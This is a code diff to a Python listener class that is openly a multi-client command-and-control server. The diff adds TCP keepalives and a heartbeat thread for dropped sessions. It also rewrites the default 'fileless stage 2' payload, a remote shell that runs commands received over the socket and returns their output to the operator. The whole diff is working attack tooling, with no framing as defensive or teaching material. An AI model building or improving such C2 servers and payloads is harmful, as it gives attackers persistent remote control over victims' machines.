@@ -46,6 +46,19 @@ class Listener:
 
         def handle_client(raw_client, addr, deploy_stage2_flag, stage2_code, context):
             try:
+                # Enable OS-level TCP Keepalives to handle dropped network packets
+                raw_client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                try:
+                    if hasattr(socket, 'TCP_KEEPIDLE'):
+                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
+                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
+                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
+                    elif hasattr(socket, 'TCP_KEEPALIVE'):
+                        # macOS specific TCP keepalive
+                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, 60)
+                except Exception:
+                    pass
+
                 client = context.wrap_socket(raw_client, server_side=True)
                 write(f"\n\n[+] Secure TLS connection established from {addr[0]}:{addr[1]}")
 
@@ -142,7 +155,28 @@ class Listener:
                             stage2_code = file.read()
                     else:
                         write(f"[!] STAGE_TWO not set or missing. Falling back to default Stage 2 shell...")
-                        stage2_code = b"""import subprocess, os\ndef run_c2():\n    global client_socket\n    client_socket.send(b"\\n[+] Fileless Stage 2 C2 Initialized Successfully!\\n")\n    while True:\n        try:\n            cmd = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()\n            if not cmd or cmd.lower() == 'exit': break\n            if cmd.startswith('cd '):\n                try: os.chdir(cmd[3:].strip())\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                else: client_socket.send(b"\\n")\n                continue\n            out = subprocess.getoutput(cmd)\n            client_socket.send((out + "\\n").encode('utf-8', errors='ignore'))\n        except Exception:\n            break\nrun_c2()\n"""
+                        stage2_code = b"""import subprocess, os\ndef run_c2():\n    global client_socket\n    client_socket.send(b"\\n[+] Fileless Stage 2 C2 Initialized Successfully!\\n")\n    while True:\n        try:\n            raw = client_socket.recv(4096)\n            if not raw: break\n            cmd = raw.decode('utf-8', errors='ignore').strip()\n            if cmd.lower() == 'exit': break\n            if not cmd: continue\n            if cmd.startswith('cd '):\n                try: os.chdir(cmd[3:].strip())\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                else: client_socket.send(b"\\n")\n                continue\n            out = subprocess.getoutput(cmd)\n            client_socket.send((out + "\\n").encode('utf-8', errors='ignore'))\n        except Exception:\n            break\nrun_c2()\n"""
+
+                def heartbeat_monitor(bound_server):
+                    """Background thread to purge dead sessions using a 1-byte ping."""
+                    while cls.active_listener_socket is bound_server:
+                        for _ in range(60):
+                            time.sleep(1)
+                            if cls.active_listener_socket is not bound_server:
+                                return
+                        for sid, info in list(cls.active_sessions.items()):
+                            try:
+                                # Send a harmless 1-byte space ping to verify the connection
+                                info["socket"].send(b" ")
+                            except Exception:
+                                try:
+                                    info["socket"].close()
+                                except Exception:
+                                    pass
+                                if sid in cls.active_sessions:
+                                    del cls.active_sessions[sid]
+
+                threading.Thread(target=heartbeat_monitor, args=(server,), daemon=True).start()
 
                 # Infinite accept loop for Multi-Client C2
                 while True:
